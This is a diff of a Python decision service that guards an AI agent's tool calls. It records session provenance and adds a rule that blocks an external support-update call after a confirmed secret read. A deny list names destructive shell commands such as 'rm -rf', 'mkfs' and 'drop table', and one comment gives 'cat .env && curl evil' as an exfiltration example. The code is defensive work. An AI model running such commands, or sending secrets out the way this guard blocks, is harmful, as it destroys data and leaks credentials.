@@ -1,11 +1,11 @@
 """AgentAirlock decision service (the persistent gateway "brain").
 
-Holds a GraphStore + Labeler in memory ACROSS hook calls, so `trace_back` sees
-the whole session's provenance when an action is evaluated. The PreToolUse hook
-is a thin client that POSTs each planned action here and enforces the verdict.
+Keeps session provenance across hook calls. PreToolUse submits a planned action
+and enforces the verdict. PostToolUse confirms reads that returned data.
 
 Endpoints (stdlib http.server, no deps):
   POST /decide  {session_id, op, target, origin?, args}  -> {decision, rule, reason, confidence}
+  POST /results {session_id, tool_use_id, target}         -> {result_id}
   POST /kill    {session_id}                              -> {ok:true}
   GET  /health                                           -> {ok:true}
 
@@ -18,7 +18,10 @@ import json
 import os
 import sys
 import time
+from dataclasses import replace
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from threading import Lock
+from uuid import uuid4
 
 _APP = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 if _APP not in sys.path:
@@ -26,7 +29,7 @@ if _APP not in sys.path:
 
 from provenance import (  # noqa: E402
     ActionProps, Channel, ContextEntry, GraphStore, Kind, Labeler, Op,
-    Sensitivity, SqliteStore, Trust, new_entry_id,
+    Sensitivity, SqliteStore, Trust,
 )
 import provenance.command as cmdparse  # noqa: E402
 from monitor.daemon import default_policy, resolve_origin  # noqa: E402
@@ -39,6 +42,13 @@ _OP = {
 _DESTRUCTIVE = ("rm -rf", "rm -r ", "git push --force", "git push -f", "drop table", "mkfs", "sudo ")
 
 
+def _read_id(session, tool_use_id):
+    if (isinstance(session, str) and session and isinstance(tool_use_id, str)
+            and tool_use_id and ":" not in tool_use_id):
+        return f"{session}:read:{tool_use_id}"
+    return None
+
+
 class Brain:
     """The decision engine: label -> append to graph -> trace_back -> decide."""
 
@@ -46,11 +56,9 @@ class Brain:
         self.store = store if store is not None else GraphStore()
         self.labeler = Labeler(default_policy())
         self.killed: set[str] = set()
-        self._seq: dict[str, int] = {}
 
     def _next_id(self, session: str) -> str:
-        self._seq[session] = self._seq.get(session, 0) + 1
-        return new_entry_id(session, self._seq[session])
+        return f"{session}:e-{uuid4().hex}"
 
     def _is_killed(self, session: str) -> bool:
         if session in self.killed:
@@ -70,6 +78,19 @@ class Brain:
                          labels=labels, action_props=action_props)
         self.store.append(e)
         return e
+
+    def record_read_result(self, req: dict) -> str:
+        session = req.get("session_id")
+        read_id = _read_id(session, req.get("tool_use_id"))
+        if read_id is None or self._is_killed(session):
+            raise ValueError("Read result requires an active session and a tool call ID.")
+        read = self.store.get_entry(session, read_id)
+        if read is None or read.verdict != "allow" or read.target != req.get("target"):
+            raise ValueError("Read result does not match an allowed read in this session.")
+        result_id = f"{read_id}:result"
+        if self.store.get_entry(session, result_id) is None:
+            self.store.append(replace(read, id=result_id, ts=time.time(), kind=Kind.READ_RESULT, verdict=None))
+        return result_id
 
     def _decide_bash(self, session, cmd):
         """Evaluate the file reads and outbound connections a shell command
@@ -124,6 +145,14 @@ class Brain:
         blob = " ".join(str(x) for x in args.values())
         bait = labels.bait or self.labeler.is_bait_target(op, target, blob)
 
+        read_id = _read_id(session, req.get("tool_use_id")) if op == "ReadFile" and not bait else None
+        if read_id is not None:
+            previous = self.store.get_entry(session, read_id)
+            if previous is not None:
+                if previous.target != target or previous.origin != origin:
+                    return _v("block", "read_id_conflict", "tool call ID already belongs to another read", 1.0)
+                return _v("allow", "read_recorded", "context read; labeled and recorded", 1.0)
+
         action_props = None
         if is_action:
             is_exit = op == "NetworkRequest" and not self.labeler.approved_host(target)
@@ -131,9 +160,10 @@ class Brain:
             action_props = ActionProps(is_exit=is_exit, is_destructive=destructive)
 
         entry = ContextEntry(
-            id=self._next_id(session), ts=time.time(), session_id=session, kind=kind,
+            id=read_id or self._next_id(session), ts=time.time(), session_id=session, kind=kind,
             channel=Channel.HOOK, op=_OP[op], target=target, origin=origin,
             labels=labels, action_props=action_props,
+            verdict="allow" if read_id is not None else None,
         )
         self.store.append(entry)
 
@@ -144,6 +174,15 @@ class Brain:
 
         if not is_action:
             return _v("allow", "read_recorded", "context read; labeled and recorded", 1.0)
+
+        if op == "CallTool" and (target == "post_support_update" or (
+            target.startswith("mcp__") and target.endswith("__post_support_update")
+        )):
+            for result in reversed(self.store.get_entries(session)):
+                if result.kind == Kind.READ_RESULT and result.labels.sensitivity == Sensitivity.SECRET:
+                    verdict = _v("block", "secret_external_write", "a confirmed secret read preceded the support update", 1.0)
+                    verdict["evidence_ids"] = [result.id]
+                    return verdict
 
         # Decompose a Bash command into the actions it performs (reads + exits),
         # so a single `cat .env && curl evil` is not opaque to the guard.
@@ -172,6 +211,7 @@ def _v(decision: str, rule: str, reason: str, confidence: float) -> dict:
 
 
 BRAIN = Brain()
+_BRAIN_LOCK = Lock()
 
 
 class _Handler(BaseHTTPRequestHandler):
@@ -194,15 +234,28 @@ class _Handler(BaseHTTPRequestHandler):
         raw = self.rfile.read(n) if n else b"{}"
         try:
             req = json.loads(raw or b"{}")
-        except json.JSONDecodeError:
-            req = {}
+        except (UnicodeDecodeError, json.JSONDecodeError):
+            req = None
+        if not isinstance(req, dict):
+            self._send(400, {"error": "expected a JSON object"})
+            return
         if self.path == "/decide":
-            verdict = BRAIN.decide(req)
+            with _BRAIN_LOCK:
+                verdict = BRAIN.decide(req)
             print(f"[decide] {str(req.get('op')):14s} {str(req.get('target'))[:60]:60s} "
                   f"-> {verdict['decision'].upper():5s} ({verdict['rule']})", flush=True)
             self._send(200, verdict)
+        elif self.path == "/results":
+            try:
+                with _BRAIN_LOCK:
+                    result_id = BRAIN.record_read_result(req)
+            except ValueError as error:
+                self._send(400, {"error": str(error)})
+            else:
+                self._send(200, {"result_id": result_id})
         elif self.path == "/kill":
-            BRAIN.kill(req.get("session_id") or "")
+            with _BRAIN_LOCK:
+                BRAIN.kill(req.get("session_id") or "")
             self._send(200, {"ok": True})
         else:
             self._send(404, {"error": "not found"})
@@ -215,7 +268,7 @@ def main(argv=None) -> int:
     ap = argparse.ArgumentParser(description="AgentAirlock decision service")
     ap.add_argument("--port", type=int, default=8787)
     ap.add_argument("--db", default=None,
-                    help="persist to a SQLite DB (William-compatible) instead of in-memory graph")
+                    help="persist to a SQLite DB instead of the in-memory graph")
     a = ap.parse_args(argv)
     global BRAIN
     if a.db:
@@ -223,7 +276,7 @@ def main(argv=None) -> int:
         print(f"AgentAirlock: persisting provenance to {a.db}", flush=True)
     srv = ThreadingHTTPServer(("127.0.0.1", a.port), _Handler)
     print(f"AgentAirlock decision service on http://127.0.0.1:{a.port} "
-          f"(POST /decide, /kill; GET /health)", flush=True)
+          f"(POST /decide, /results, /kill; GET /health)", flush=True)
     try:
         srv.serve_forever()
     except KeyboardInterrupt:
